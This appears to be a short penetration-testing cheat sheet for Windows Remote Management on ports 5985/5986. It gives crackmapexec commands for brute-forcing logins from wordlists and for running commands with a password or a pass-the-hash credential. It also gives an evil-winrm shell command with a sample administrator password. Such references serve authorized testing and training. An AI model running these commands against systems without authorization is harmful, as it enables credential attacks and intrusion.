*Listen on one of two ports:*

- **5985/tcp (HTTP)**
- 5986/tcp (HTTPS)

### Brute force

```
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```

### Just check a pair of credentials
### Username + Password + CMD command execution

```
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
```

### Username + Hash + PS command execution
### Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm

```
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
```

```
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```

